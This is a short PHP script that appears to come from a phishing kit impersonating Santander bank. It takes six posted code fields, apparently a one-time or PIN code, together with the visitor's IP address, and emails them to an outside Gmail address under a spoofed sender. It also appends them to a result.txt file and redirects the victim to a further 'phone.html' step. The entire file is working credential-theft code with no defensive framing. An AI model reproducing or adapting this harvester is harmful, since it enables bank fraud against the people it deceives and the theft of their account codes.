<?php

$ip = getenv("REMOTE_ADDR");



$message .= "#                       #\n";
$message .= "#============= LOG ============#\n";
$message .= "#                       #\n";
$message .= "============================ : $ip\n";
$message .= "password :  ".$_POST['code1'].".-.".$_POST['code2'].".-.".$_POST['code3'].".-.".$_POST['code4'].".-.".$_POST['code5'].".-.".$_POST['code6']."\n";
$message .= "============================ : $ip\n";

$send = "michelponda@gmail.com";


$subject = "|Santander| $ip |";


$from = "From: Spain <josfrans@server1.startsting.nl>";


mail($send,$subject,$message,$from);

$file = fopen("../result.txt", 'a');
fwrite($file, $message);

header("Location: phone.html");
?>